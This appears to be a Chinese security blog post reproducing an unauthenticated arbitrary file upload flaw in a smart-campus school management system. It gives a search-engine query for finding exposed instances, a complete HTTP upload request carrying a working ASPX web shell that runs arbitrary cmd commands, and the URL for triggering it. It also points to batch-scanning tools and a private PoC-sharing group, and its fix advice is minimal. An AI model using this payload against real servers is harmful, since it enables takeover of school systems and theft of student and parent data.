#  【漏洞复现】智慧校园(某校易)管理系统 FileUpAd.aspx 任意文件上传漏洞   
Superhero  Nday Poc   2024-08-26 23:33  
  
**0x00 免责声明**  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
**0x01 产品简介**  
  
  
“某校易”是某达云创公司基于多年教育市场信息化建设经验沉淀，经过充分的客户需求调研，并依据国家“十三五”教育信息化建设规范而推出的综合互联网+教育信息化解决方案。“某校易”以物联网技术为基础，以学生在校“学食住行”管理为中心，将消费管理、门禁管理、各类学生出入管理、家校互通、校门口进出身份识别等系统进行集成，有效减少校园管理盲点，提升校园安全防范与管理水平。  
  
**0x02 漏洞概述**  
  
  
智慧校园(某校易)管理系统 FileUpAd.aspx 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。  
  
**0x03 搜索引擎**  
```
title="智慧综合管理平台登入"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKbI3NL2rzh8T6MOeOvKc38xc8dGQIUxwW15lLoRVGTYQTWX9hwcXeaJTuEJmGyaib2ypqhOGv9NpA/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 漏洞复现**  
```
POST /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
Connection: close
 
------21909179191068471382830692394
Content-Disposition: form-data; name="File"; filename="asd.aspx"
Content-Type: image/jpeg
 
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------21909179191068471382830692394--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKbI3NL2rzh8T6MOeOvKc38aAyqTg6N1c5nDibohANJG5eOiaYfqESg0MlWibNjV9ApIKEddCrQygWCg/640?wx_fmt=png&from=appmsg "")  
```
/imgnews/imgad/000000/upload.aspx?cmd=whoami
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKbI3NL2rzh8T6MOeOvKc38oBrHEPQicvWQiciaSoMup6XxObk5URLPdsnJzOE8ez3zC3ibZxRhibetj7Q/640?wx_fmt=png&from=appmsg "")  
  
  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKbI3NL2rzh8T6MOeOvKc38bxvxPqL1g3C7ibZeHOfJ5nKzib6ZOBiboicibJWfcWkHDicXyJAKe6qYyrkA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKbI3NL2rzh8T6MOeOvKc38u73ucLn2V6pkuTwDH6Jia0dKpClVY0vJrjMYfbv4ia2ibKSAr8YYaWvAQ/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKbI3NL2rzh8T6MOeOvKc380pBaqNMCibYRx4kMXk4IIj6teOiaqGFnMviaicFjCYbzBUm5ibIWyKeyfGw/640?wx_fmt=png&from=appmsg "")  
  
POC脚本获取  
  
请使用VX扫一扫加入内部  
POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
**0x06 修复建议**  
  
1、关闭互联网暴露  
面或接口设置访问权限  
  
2、升级至安全版本  
  
  
